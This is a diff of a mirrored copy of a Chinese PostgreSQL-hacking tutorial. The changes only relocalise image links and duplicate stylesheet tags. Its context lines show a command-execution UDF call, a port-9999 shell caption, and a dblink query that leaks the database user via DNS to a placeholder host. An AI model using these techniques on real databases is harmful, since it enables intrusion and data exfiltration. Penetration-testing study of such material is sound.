@@ -3,7 +3,7 @@
 			<head>
 			     <title>Hacking PostgreSQL - Ricter</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/6449">http://drops.wooyun.org/tips/6449</a></h1>
 				
@@ -64,7 +64,7 @@ select exec();
 
 <p>监听的 9999 端口得到一个 shell：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150603/20150603220539461053.jpg" alt=""></p>
+<p><img src="../images_result/images/20150603220539461053.jpg" alt=""></p>
 
 <h3>Python</h3>
 
@@ -93,7 +93,7 @@ $$ LANGUAGE plpython2u;
 
 <p>我们可以根据返回来判断利用哪个语言（plpython2u、plpythonu、plpython3u 等等）。</p>
 
-<p><img src="http://static.wooyun.org//drops/20150603/20150603220535246851.jpg" alt=""></p>
+<p><img src="../images_result/images/20150603220535246851.jpg" alt=""></p>
 
 <p>创建好 UDF 后，直接调用如下语句即可：</p>
 
@@ -101,7 +101,7 @@ $$ LANGUAGE plpython2u;
 select system('ls -la');
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150603/20150603220538662112.jpg" alt=""></p>
+<p><img src="../images_result/images/20150603220538662112.jpg" alt=""></p>
 
 <p>此外，sh、ruby 等同理，可以参考官方文档来写一个 UDF。</p>
 
@@ -123,11 +123,11 @@ CREATE EXTENSION dblink
 SELECT * FROM dblink('host='||(select user)||'.f27558c1f94c0595.xxxxx.xx user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT);
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20150603/20150603220540592624.jpg" alt=""></p>
+<p><img src="../images_result/images/20150603220540592624.jpg" alt=""></p>
 
 <p>远程获取到请求内容：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150603/20150603220542272615.jpg" alt=""></p>
+<p><img src="../images_result/images/20150603220542272615.jpg" alt=""></p>
 
 <h1>0x04 读写文件</h1>
 
@@ -179,7 +179,7 @@ SELECT lo_unlink(12345);
 </code></pre>
 
 <p>其中每一段都要小于等于 2KB，这样就可以成功写入：<br>
-<img src="http://static.wooyun.org//drops/20150603/20150603220544750636.jpg" alt=""></p>
+<img src="../images_result/images/20150603220544750636.jpg" alt=""></p>
 
 <h1>0x05 XXE</h1>
 
